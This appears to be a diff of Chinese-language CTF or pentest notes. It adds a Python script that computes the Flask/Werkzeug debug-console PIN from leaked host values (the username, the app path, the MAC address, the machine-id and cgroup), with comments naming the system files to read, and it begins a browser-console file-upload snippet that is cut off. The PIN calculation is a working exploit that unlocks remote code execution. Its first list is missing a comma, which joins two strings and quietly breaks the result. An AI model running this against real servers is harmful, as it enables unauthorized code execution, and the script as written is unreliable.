@@ -1,4 +1,56 @@
-浏览器控制台上传文件
+
+# Flask PIN值计算
+```python
+import hashlib
+from itertools import chain
+ 
+probably_public_bits = [
+    'root'  # username 可通过/etc/passwd获取
+    'flask.app',  # modname默认值
+    'Flask',  # 默认值 getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # 路径 可报错得到  getattr(mod, '__file__', None)
+]
+ 
+private_bits = [
+    '77154419714822',  # /sys/class/net/eth0/address mac地址十进制
+    '96cec10d3d9307792745ec3b85c89620docker-ad2da0cd088fbb15c29dfb699899a4d50788db7f47701e9ad0ff4c79169249b4.scope'
+ 
+    # 字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup
+    # 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup
+]
+ 
+# 下面为源码里面抄的，不需要修改
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+ 
+cookie_name = '__wzd' + h.hexdigest()[:20]
+ 
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+ 
+rv = None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+ 
+print(rv)
+```
+
+
+# 浏览器控制台上传文件
 ```js
 fetch("http://localhost:18044/upload.php", {
   "headers": {
